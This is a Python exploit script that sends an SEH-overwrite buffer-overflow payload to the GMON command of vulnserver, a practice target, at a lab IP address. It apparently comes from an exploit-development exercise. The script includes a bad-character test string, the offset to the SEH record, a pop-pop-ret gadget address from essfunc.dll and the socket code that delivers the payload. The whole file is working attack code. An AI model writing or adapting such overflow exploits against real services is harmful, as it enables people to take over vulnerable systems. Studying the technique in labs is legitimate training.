#!/usr/bin/env python

from socket import socket, AF_INET, SOCK_STREAM, error, timeout
from sys import exit
from struct import pack

rhost = "192.168.41.128"
rport = 9999
target = (rhost, rport)
target_length = 5000


def validate_payload_length(current_length, expected_length):
    if current_length != expected_length:
        print(
            (
                "[!] Payload was length {current_length}. "
                "Expected: {expected_length}"
            ).format(current_length=current_length, expected_length=expected_length)
        )
        exit(1)


confirmed_bad_chars = ['\x00']

bad_chars = (
    "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f"
    "\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20"
    "\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31"
    "\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42"
    "\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53"
    "\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64"
    "\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75"
    "\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86"
    "\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97"
    "\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8"
    "\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9"
    "\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca"
    "\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb"
    "\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec"
    "\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd"
    "\xfe\xff")

payload = ""
payload += "GMON "
payload += "/.:/"

# Message=    SEH record (nseh field) at 0x00b7ffdc overwritten with normal pattern : 0x45356d45 (offset 3495), followed by 28 bytes of cyclic data after the handler
nseh = "B" * 4
# Message=  0x6250172b : pop edi # pop ebp # ret  | asciiprint,ascii {PAGE_EXECUTE_READ} [essfunc.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: True, v-1.0- (\\vmware-host\Shared Folders\WindowsVMs\VulnerableApps\vulnserver\essfunc.dll)
seh = pack("<L", 0x6250172b)
payload += bad_chars
payload += "A" * (3495 - len(bad_chars))
payload += nseh
payload += seh
payload += "D" * (4989 - 8 - 3495)
payload += "\r\n"

if __name__ == "__main__":
    validate_payload_length(current_length=len(payload), expected_length=target_length)
    print("[*] Connecting to target")
    s = socket(AF_INET, SOCK_STREAM)
    s.settimeout(10)
    try:
        s.connect(target)
    except timeout:
        print("[!] Timed out connecting to the service. Is it paused in the debugger?")
        exit(1)
    except error:
        print("[!] Failed to connect to remote service, is it running?")
        exit(1)
    print("[*] Checking for welcome message")
    try:
        welcome = s.recv(1024)
    except timeout:
        print(
            (
                "[!] Timed out waiting for the welcome message. "
                "Is it paused in the debugger?"
            )
        )
        exit(1)
    except error:
        print("[!] Failed to receive welcome message. Uh oh...")
        exit(1)
    print("[*] Welcome message received")
    print("\t" + welcome.rstrip())
    print("[*] Sending payload")
    s.send(payload)
    print("B00M! ph33r")
